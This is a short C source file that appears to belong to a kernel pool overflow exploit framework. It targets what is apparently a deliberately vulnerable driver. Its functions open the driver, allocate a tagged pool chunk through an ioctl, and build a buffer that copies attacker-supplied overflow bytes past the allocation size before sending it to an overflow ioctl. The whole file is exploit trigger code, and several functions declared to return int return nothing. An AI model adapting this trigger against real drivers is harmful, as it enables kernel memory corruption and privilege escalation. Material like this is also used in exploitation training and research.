#include <stdio.h>


#include "exploit.h"
#include "vuln_driver_client.h"

int init_vuln()
{
    open_driver();
}

uintptr_t alloc_vuln(xploit_t * xploit)
{
    // VULN
    uintptr_t vuln = alloc_ioctl(xploit->targeted_vuln_size, xploit->targeted_pooltype, 0x4e4c5556);
    return vuln;
}

int trigger_vuln(xploit_t * xploit, char * overflow, uintptr_t overflow_size)
{
    char string[0x1000];

    memset(string, 0x44, 0x500);

    memcpy(string + xploit->targeted_vuln_size, overflow, overflow_size);

    overflow_ioctl(xploit->targeted_vuln_size + overflow_size, string);
}

int free_vuln()
{
    free_ioctl();
}
